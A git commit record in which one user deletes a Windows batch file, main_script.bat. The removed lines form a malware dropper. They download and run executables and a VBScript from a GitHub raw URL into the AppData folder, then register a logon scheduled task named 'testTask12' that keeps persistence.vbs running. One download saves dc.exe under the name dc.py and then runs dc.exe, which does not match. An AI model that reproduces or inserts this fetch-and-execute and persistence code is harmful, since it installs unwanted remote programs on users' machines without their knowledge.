6e2d5dc2059b75a7178f626c497ed41dbd07373e
ishanarya24 <91789624+ishanarya24@users.noreply.github.com>
2022-01-08 16:37:31 +0530

    Delete main_script.bat

--- main_script.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe
-IF EXIST %appdata%\script.bat (EXIT) ELSE(cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && curl https://raw.githubusercontent.com/ishanarya24/dc/main/persistence.vbs -O && start persistence.vbs && curl https://raw.githubusercontent.com/ishanarya24/dc/main/dc.exe --output %appdata%/dc.py && %appdata%/dc.exe && cmd /c SCHTASKS /CREATE /SC ONLOGIN /TN "testTask12" /TR %appdata%\persistence.vbs)
